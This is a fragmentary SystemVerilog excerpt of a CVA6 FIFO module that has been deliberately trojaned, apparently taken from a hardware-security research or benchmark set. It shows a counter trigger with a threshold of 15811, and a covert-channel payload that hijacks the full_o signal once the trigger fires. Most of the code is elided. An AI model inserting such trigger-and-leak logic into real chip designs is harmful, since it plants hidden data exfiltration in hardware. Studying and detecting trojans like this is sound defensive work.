...
module cva6_fifo_v3_trojan_Covert #(
    ...
    // ============================================================
    // TROJAN TRIGGER - Type 1: Simple Counter (threshold=15811)
    // ============================================================
    localparam int TRIGGER_THRESHOLD = 15811;
  ...
  if (DEPTH == 0) begin : gen_pass_through
    ...
    assign full_o = trojan_active ? covert_bit_out : (~pop_i);  // TROJAN Covert
